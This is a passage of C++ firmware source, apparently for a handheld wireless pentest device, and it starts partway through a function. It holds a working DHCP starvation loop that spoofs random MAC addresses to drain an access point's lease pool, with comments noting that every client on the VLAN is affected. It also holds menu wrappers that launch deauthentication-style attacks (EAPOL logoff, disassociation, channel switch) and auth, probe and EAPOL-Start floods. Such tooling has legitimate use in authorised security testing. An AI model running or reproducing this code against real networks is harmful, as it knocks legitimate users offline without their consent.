    uint32_t lastTick = 0;
    uint32_t noOffer = 0;
    uint8_t disc[MORE_DHCP_DISCOVER_LEN];
    uint8_t req[MORE_DHCP_SELECT_LEN];
    uint8_t reply[600];

    while (!EscPress && (untilBack || moreTimeLeft(start, durationMs))) {
        uint8_t chaddr[6];
        moreRandomMac(chaddr);
        size_t dlen = moreBuildDhcpDiscover(disc, sizeof(disc), chaddr);
        const uint32_t xid =
            ((uint32_t)disc[4] << 24) | ((uint32_t)disc[5] << 16) | ((uint32_t)disc[6] << 8) | disc[7];
        if (!moreSendDhcpFrame(iface, disc, dlen)) {
            res.error = "raw send failed";
            break;
        }
        res.frames++;

        bool gotOffer = false;
        uint32_t yiaddr = 0;
        uint8_t sid[4] = {0};
        // The AP answers in well under a millisecond; the 25 ms budget also
        // paces the loop at about 40 handshakes per second.
        for (int wait = 0; wait < 5 && !gotOffer; wait++) {
            fd_set rfds;
            FD_ZERO(&rfds);
            FD_SET(sock, &rfds);
            struct timeval tv;
            tv.tv_sec = 0;
            tv.tv_usec = 5000;
            if (select(sock + 1, &rfds, NULL, NULL, &tv) <= 0) continue;
            struct sockaddr_in from;
            socklen_t fromLen = sizeof(from);
            int n = recvfrom(sock, reply, sizeof(reply), 0, (struct sockaddr *)&from, &fromLen);
            if (n > 0 && moreParseDhcpOffer(reply, n, xid, &yiaddr, sid)) gotOffer = true;
        }
        if (gotOffer) {
            noOffer = 0;
            size_t rlen = moreBuildDhcpSelect(req, sizeof(req), chaddr, xid, yiaddr, sid);
            if (rlen != 0 && moreSendDhcpFrame(iface, req, rlen)) res.frames++;
        } else if (!untilBack && ++noOffer >= 200) {
            // A /24 with 200 clients has only a handful of free leases; once the
            // server stops offering there is nothing left to commit. 200 quiet
            // attempts is about five seconds, short enough not to stall a sweep
            // and long enough to ride out a lost packet or two.
            res.detail += " (no offers)";
            break;
        }
        if (EscPress) break;
        moreTick(res.frames, start, progress, lastTick);
    }

    if (untilBack && EscPress) res.detail += " (BACK)";
    close(sock);
    if (dhcpcStopped) esp_netif_dhcpc_start(sta);
    if (!alreadyJoined) wifiDisconnect();

    res.targets = 1;
    res.ok = (res.error == nullptr);
    // The wall clock of the whole attempt, join included. The send loop keeps
    // its own `start`, which is the duration the caller asked for.
    res.seconds = (millis() - startedAll) / 1000;
    return res;
}

// ============================================================================
// Shared helpers for the menu and the console
// ============================================================================

bool moreParseMac(const String &mac, uint8_t out[6]) {
    unsigned int v[6];
    if (sscanf(mac.c_str(), "%x:%x:%x:%x:%x:%x", &v[0], &v[1], &v[2], &v[3], &v[4], &v[5]) != 6) return false;
    for (int i = 0; i < 6; i++) {
        if (v[i] > 0xFF) return false;
        out[i] = (uint8_t)v[i];
    }
    return true;
}

const char *moreTargetAtkName(int id) {
    switch (id) {
        case 0: return "EAPOL Logoff";
        case 1: return "Channel Switch";
        case 2: return "Bad Message";
        case 3: return "Authentication Attack";
        case 4: return "Disassociation Attack";
        case 5: return "DHCP Starvation";
        default: return "Unknown";
    }
}

MoreAtkResult moreRunTargetAtk(
    int id, const String &ssid, const String &mac, uint8_t channel, uint8_t newChannel, uint32_t durationMs,
    const MoreProgressFn &progress, const String &password
) {
    uint8_t bssid[6];
    if (!moreParseMac(mac, bssid)) {
        MoreAtkResult res;
        res.error = "invalid BSSID";
        return res;
    }
    switch (id) {
        case 0: return more_eapol_logoff(bssid, channel, durationMs, progress);
        case 1: return more_channel_switch(bssid, ssid.c_str(), channel, newChannel, durationMs, progress);
        case 2: return more_bad_message(bssid, channel, durationMs, progress);
        case 3: return more_auth_attack(bssid, channel, durationMs, progress);
        case 4: return more_disassoc_attack(bssid, channel, durationMs, progress);
        case 5: return more_dhcp_starvation(bssid, ssid, password, channel, durationMs, progress);
        default: {
            MoreAtkResult res;
            res.error = "unknown attack";
            return res;
        }
    }
}

// ============================================================================
// On-device UI
// ============================================================================

/// Default run time for a menu-driven attack.
#define MORE_MENU_MS 15000

/// Drop presses that queued up while an attack was running, so the press that
/// dismisses a result screen cannot also fire on the menu rebuilt behind it.
static void moreClearPendingKeys() {
    EscPress = false;
    SelPress = false;
    PrevPress = false;
    NextPress = false;
    UpPress = false;
    DownPress = false;
    AnyKeyPress = false;
}

static void moreWaitAnyKey() {
    moreClearPendingKeys();
    while (!check(AnyKeyPress)) vTaskDelay(pdMS_TO_TICKS(20));
    moreClearPendingKeys();
}

static void moreStatusScreen(const String &title, const String &line1, const String &line2) {
    drawMainBorderWithTitle(title);
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    if (line1.length()) tft.drawString(line1.substring(0, 34), 10, 45);
    if (line2.length()) tft.drawString(line2, 10, 63);
    tft.drawString("Press BACK to stop", 10, tftHeight - 20);
}

static void moreResultScreen(const String &title, const MoreAtkResult &r) {
    drawMainBorderWithTitle(title);
    tft.setTextColor(r.ok ? TFT_GREEN : TFT_RED, bruceConfig.bgColor);
    tft.drawString(r.ok ? "Finished" : "Failed", 10, 42);
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    tft.drawString(String("Frames: ") + String(r.frames), 10, 62);
    tft.drawString(String("Time: ") + String(r.seconds) + "s", 10, 80);
    tft.drawString(String("Targets: ") + String(r.targets), 10, 98);
    if (r.detail.length()) tft.drawString(r.detail.substring(0, 34), 10, 116);
    if (r.error) tft.drawString(String("Err: ") + r.error, 10, 134);
    tft.drawString("Press any key", 10, tftHeight - 20);
    moreWaitAnyKey();
}

/// Live counter painted by the attack loop through its progress callback.
static MoreProgressFn moreMenuProgress(const String &title, const String &target) {
    return [title, target](uint32_t frames, uint32_t elapsed) {
        drawMainBorderWithTitle(title);
        tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
        tft.drawString(target.substring(0, 34), 10, 45);
        tft.drawString(String("Frames: ") + String(frames), 10, 63);
        tft.drawString(String("Time: ") + String(elapsed / 1000) + "s", 10, 81);
        tft.drawString("Press BACK to stop", 10, tftHeight - 20);
    };
}

static void moreRunTargetUi(int id, const String &ssid, const String &mac, uint8_t channel, uint8_t newChannel) {
    uint32_t t0 = millis();
    moreStatusScreen(moreTargetAtkName(id), ssid, String("Ch: ") + String(channel));
    MoreAtkResult r =
        moreRunTargetAtk(id, ssid, mac, channel, newChannel, MORE_MENU_MS, moreMenuProgress(moreTargetAtkName(id), mac));
    r.seconds = (millis() - t0) / 1000;
    moreResultScreen(moreTargetAtkName(id), r);
}

// The targeted attacks used to live behind the nested "More Attacks" page that
// hung off Target Attacks. That page is gone: each attack is now a row of the
// Target Attacks menu itself, so it is wrapped in its own status/result screen
// here and called directly. The signatures match the other menu entries so
// wifi_atks.cpp can drop them straight into its option vector.
void moreTargetEapolLogoff(const String &tssid, const String &mac, uint8_t channel) {
    moreRunTargetUi(0, tssid, mac, channel, 0);
}

void moreTargetChannelSwitch(const String &tssid, const String &mac, uint8_t channel) {
    String ch = num_keyboard("11", 2, "New channel (1-14):");
    int newCh = ch.toInt();
    if (newCh < 1 || newCh > 14) newCh = 11;
    moreRunTargetUi(1, tssid, mac, channel, (uint8_t)newCh);
}

void moreTargetBadMessage(const String &tssid, const String &mac, uint8_t channel) {
    moreRunTargetUi(2, tssid, mac, channel, 0);
}

void moreTargetAuthAttack(const String &tssid, const String &mac, uint8_t channel) {
    moreRunTargetUi(3, tssid, mac, channel, 0);
}

void moreTargetDisassoc(const String &tssid, const String &mac, uint8_t channel) {
    moreRunTargetUi(4, tssid, mac, channel, 0);
}

// DHCP starvation needs a station link, so it asks for the AP password only when
// the board does not already have one for this SSID - the same saved-password-
// first rule every other connect path uses.
void moreTargetDhcpStarve(const String &tssid, const String &mac, uint8_t channel) {
    String pass = bruceConfig.getWifiPassword(tssid);
    if (pass.length() == 0) {
        pass = keyboard(pass, 63, "AP Password (empty=open):", true);
        if (pass == "\x1B") return;
    }

    uint8_t bssid[6];
    if (!moreParseMac(mac, bssid)) {
        MoreAtkResult bad;
        bad.error = "invalid BSSID";
        moreResultScreen("DHCP Starvation", bad);
        return;
    }

    uint32_t t0 = millis();
    // Pool-wide, not per-client: every lease comes out of the selected AP's
    // DHCP pool, which is the VLAN's pool, so every client on that network is
    // affected. It runs until BACK; there is no fixed duration.
    moreStatusScreen("DHCP Starvation", tssid, "Whole VLAN - BACK to stop");
    MoreAtkResult r = more_dhcp_starvation(
        bssid, tssid, pass, channel, 0, moreMenuProgress("DHCP Starvation", tssid), true
    );
    r.seconds = (millis() - t0) / 1000;
    // The menu result is otherwise invisible over USB; print it so a run can be
    // confirmed (and a BACK stop shows its duration) from the console.
    serialDevice->println(
        String("RESULT name=dhcpstarve menu=1 ok=") + (r.ok ? "1" : "0") + " frames=" + String(r.frames) +
        " seconds=" + String(r.seconds) + " detail=" + r.detail + " error=" + (r.error ? r.error : "-")
    );
    moreResultScreen("DHCP Starvation", r);
}

// The flood attacks used to live in a nested "More Attacks" page. They are now
// entries of the main WiFi Attacks menu (wifi_atk_menu), so each one is wrapped
// in its own status/result screen here and called directly.
void moreAuthFloodMenu() {
    uint32_t t0 = millis();
    moreStatusScreen("Auth Flood", "all APs in range", "open-system auth frames");
    MoreAtkResult r = more_auth_flood(MORE_MENU_MS, moreMenuProgress("Auth Flood", "all APs"));
    r.seconds = (millis() - t0) / 1000;
    moreResultScreen("Auth Flood", r);
}

void moreProbeFloodMenu() {
    uint32_t t0 = millis();
    moreStatusScreen("Probe Request", "random SSIDs", "all channels");
    MoreAtkResult r = more_probe_flood(MORE_MENU_MS, "", true, moreMenuProgress("Probe Request", "random SSIDs"));
    r.seconds = (millis() - t0) / 1000;
    moreResultScreen("Probe Request", r);
}

void moreEapolStartMenu() {
    uint32_t t0 = millis();
    moreStatusScreen("EAPOL Attack", "EAPOL-Start flood", "all APs in range");
    MoreAtkResult r = more_eapol_start_flood(MORE_MENU_MS, moreMenuProgress("EAPOL Attack", "all APs"));
    r.seconds = (millis() - t0) / 1000;
    moreResultScreen("EAPOL Attack", r);
}
